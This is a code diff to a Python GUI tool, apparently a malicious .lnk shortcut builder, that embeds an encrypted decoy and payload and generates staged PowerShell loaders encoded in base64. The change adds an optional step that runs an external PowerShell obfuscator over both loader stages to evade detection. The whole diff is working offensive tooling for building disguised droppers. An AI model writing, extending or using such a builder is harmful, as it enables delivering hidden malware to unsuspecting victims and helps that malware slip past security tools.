@@ -7,6 +7,7 @@ import string
 import sys
 import re
 import os
+import tempfile
 import base64
 from datetime import datetime
 from PyQt6.QtWidgets import QApplication, QWidget, QLabel, QVBoxLayout, QHBoxLayout,QRadioButton,QButtonGroup, QLineEdit, QPushButton, QTextEdit, QMessageBox, QComboBox, QFileDialog, QMenuBar
@@ -105,7 +106,7 @@ Invoke-Item $decoy_file;
 #replacemepayloadexec'''
 
 
-stage1_command_template = '''$script_start_byte = #replacemeloaderstartbyte
+stage1_command_template = '''$script_start_byte = #replacemeloaderstartbyte;
 $script_length = #replacemescriptlength;
 $filename = Get-ChildItem *.lnk | Where-Object {$_.Length -eq #replacemetotallnkfilesize} | Select-Object -ExpandProperty Name;
 $env:lnkfilename = $filename;
@@ -261,6 +262,16 @@ def append_file(source, seek=None):
 
         out_file.write(data)
 
+def run_obfuscator(tool_path: str, input_path: str) -> str:
+    if not os.path.exists(input_path):
+        raise RuntimeError(f"Input path not found: {input_path}")
+
+    cmd = [tool_path, input_path]
+    cp = subprocess.run(cmd, capture_output=True, text=True)
+    if cp.returncode != 0:
+        raise RuntimeError(f"Transformer failed (exit {cp.returncode}): {cp.stderr.strip()}")
+    return cp.stdout
+
 
 class MainWindow(QWidget):
     def __init__(self):
@@ -390,6 +401,17 @@ class MainWindow(QWidget):
         self.video_button.toggled.connect(self.update_icon)
         self.update_icon()
 
+        psobfuscator_file_label = QLabel("PowerShell Obfuscator (Optional):")
+        layout.addWidget(psobfuscator_file_label)
+        psobfuscator_layout = QHBoxLayout()
+        self.psobfuscator_file_input = QLineEdit()
+        self.psobfuscator_browse_button = QPushButton("Import")
+        self.psobfuscator_browse_button.setFixedWidth(100)
+        self.psobfuscator_browse_button.clicked.connect(self.handle_payload_type_change)
+        psobfuscator_layout.addWidget(self.psobfuscator_file_input)
+        psobfuscator_layout.addWidget(self.psobfuscator_browse_button)
+        layout.addLayout(psobfuscator_layout)
+
         console_label = QLabel("Building Console")
         layout.addWidget(console_label)
         self.console = QTextEdit()
@@ -454,6 +476,12 @@ class MainWindow(QWidget):
             if file_path:
                 self.decoy_file_input.setText(file_path)
 
+        bbutton3 = QObject.sender(self.psobfuscator_browse_button)
+        if bbutton3 is self.psobfuscator_browse_button:
+            file_path, _ = QFileDialog.getOpenFileName(self, "Select Powershell Obfuscator File")
+            if file_path:
+                self.psobfuscator_file_input.setText(file_path)
+
 
     def generate_payload(self):
         global loader_template
@@ -501,6 +529,7 @@ class MainWindow(QWidget):
         loader_start_byte = 0x00003000 + decoysize + 1 + payloadsize + 1
         xor_key = ''.join(random.choices(string.ascii_letters + string.digits, k=15))
         loader_template = loader_template.replace('#replacemexorkey', xor_key)
+        obfuscator_path = self.psobfuscator_file_input.text().strip()
         
         if self.txt_button.isChecked():
             icon = 'C:\\Windows\\System32\\notepad.exe'
@@ -569,13 +598,26 @@ class MainWindow(QWidget):
             with open('decoy_enc', 'wb') as file:
                 file.write(decoyfile_enc)
             self.console.append(f"[*] Success! Encrypted Decoy File size: {decoybyte_count} bytes")
+            self.console.append("[*] Generating Stage 2 Loader")
             loader_template = loader_template.replace('#replacemedecoyname', str(decoyname))
             loader_template = loader_template.replace('#replacemedecoylength', str(decoybyte_count))
             if payload_type != "PowerShell Script":
                 loader_template = loader_template.replace('#replacemepayloadstartbyte', f'0x{payload_start_byte:08x}')
                 loader_template = loader_template.replace('#replacemepayloadlength', str(payloadbyte_count))
-            self.console.append("[*] Generating Stage 2 Loader")
-            loader_utf8_content = loader_template.encode('utf-8')
+            loader_path = os.path.join(tempfile.gettempdir(), "loader")
+            with open(loader_path, 'w', encoding="utf-8") as loader_file:
+                loader_file.write(loader_template)
+            if obfuscator_path:
+                self.console.append("[*] Obfuscating Stage 2...")
+                try:
+                    stage2_processed = run_obfuscator(obfuscator_path, loader_path)
+                    self.console.append("[*] Stage 2 obfuscation finished!")
+                except RuntimeError as e:
+                    self.console.append(f"[-] Obfuscation error: {e}")
+                    return
+            else:
+                stage2_processed = loader_template
+            loader_utf8_content = stage2_processed.encode('utf-8')
             loaderbase64_encoded = base64.b64encode(loader_utf8_content)
             with open('loader_enc', 'wb') as output_file:
                 output_file.write(loaderbase64_encoded)
@@ -595,7 +637,20 @@ class MainWindow(QWidget):
             stage1_command_template = stage1_command_template.replace('#replacemescriptlength', str(script_length))
             stage1_command_template = stage1_command_template.replace('#replacemetotallnkfilesize', str(totallnkfilesize))
             stage1_command_template = stage1_command_template.replace('#replacemeloaderstartbyte', f'0x{loader_start_byte:08x}')
-            stage1_utf16le_content = stage1_command_template.encode('utf-16le')
+            stage1_path = os.path.join(tempfile.gettempdir(), "stage1")
+            with open(stage1_path, 'w', encoding="utf-8") as stage1_file:
+                stage1_file.write(stage1_command_template)
+            if obfuscator_path:
+                self.console.append("[*] Obfuscating stage 1...")
+                try:
+                    stage1_processed = run_obfuscator(obfuscator_path, stage1_path)
+                    self.console.append("[*] Stage 1 obfuscation finished!")
+                except RuntimeError as e:
+                    self.console.append(f"[-] Obfuscation error: {e}")
+                    return
+            else:
+                stage1_processed = stage1_command_template
+            stage1_utf16le_content = stage1_processed.encode('utf-16le')
             stage1base64_encoded = base64.b64encode(stage1_utf16le_content)
             stringstage1encoded = stage1base64_encoded.decode('utf-8')
             self.console.append("[*] Success! Stage 1 Generated!")
